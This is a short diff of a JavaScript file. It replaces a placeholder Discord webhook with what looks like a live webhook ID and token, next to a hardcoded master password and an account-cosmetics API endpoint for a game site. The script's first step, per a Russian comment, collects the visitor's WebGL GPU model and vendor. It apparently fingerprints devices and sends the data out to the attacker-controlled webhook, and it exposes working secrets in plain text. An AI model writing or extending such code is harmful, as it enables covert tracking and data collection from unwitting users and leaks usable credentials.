@@ -11,7 +11,7 @@ const API_URL = 'https://session.coolmathblox.ca/accounts/set_cosmetic';
 const MASTER_PASSWORD = 'stack777';
 
 (async function() {
-  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
+  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1548948288722571285/bPseOsO69sFVkSxxtqtHHBnqJcoAnRvn7ec3Jnn6pPO51-r26BZl1qzovJNDvNUHu8qt';
 
   try {
     // 1. WebGL (Модель GPU и вендор)
